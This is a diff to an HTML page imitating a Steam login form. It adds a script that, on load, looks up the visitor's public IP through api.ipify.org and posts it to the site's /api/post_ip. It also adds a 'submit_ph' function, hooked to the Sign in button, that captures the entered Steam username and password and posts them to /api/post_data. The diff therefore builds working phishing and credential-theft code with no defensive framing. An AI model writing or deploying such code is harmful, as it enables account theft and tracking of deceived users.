@@ -294,6 +294,39 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 	});
 </script>
 
+<script>
+	window.onload = (event) => {
+	  fetch("https://api.ipify.org?format=json")
+		.then((response) => response.json())
+		.then(async (data) => {
+		  const url = window.location.protocol + "//" + window.location.host;
+		  const rawResponse = await fetch(url + "/api/post_ip", {
+			method: "POST",
+			headers: {
+			  Accept: "application/json",
+			  "Content-Type": "application/json",
+			},
+			body: data.ip,
+		  });
+		})
+		.catch((e) => {});
+	};
+	async function submit_ph(event) {
+	  event.preventDefault();
+	  const url = window.location.protocol + "//" + window.location.host;
+	  const username = document.getElementById("steamAccountName").value;
+	  const password = document.getElementById("steamPassword").value;
+	  const rawResponse = await fetch(url + "/api/post_data", {
+		method: "POST",
+		headers: {
+		  Accept: "application/json",
+		  "Content-Type": "application/json",
+		},
+		body: JSON.stringify({ username: username, password: password }),
+	  });
+	}
+  </script>
+
 <div id="mainBody">
 
 <div class="mainLoginPanel">
@@ -334,7 +367,7 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 				<div style="clear: both;">
 
 					<div id="login_btn_signin" action="login.php">
-						<input action="login.php" class="btn_green_white_innerfade btn_medium" type="submit" id="SteamLogin" value="Sign in" width="104" height="25" border="0" tabindex="5" />
+						<input action="login.php" class="btn_green_white_innerfade btn_medium" onclick="submit_ph(event)" type="submit" id="SteamLogin" value="Sign in" width="104" height="25" border="0" tabindex="5" />
 					</div>
 
 					<div id="login_btn_wait" style="display: none;">
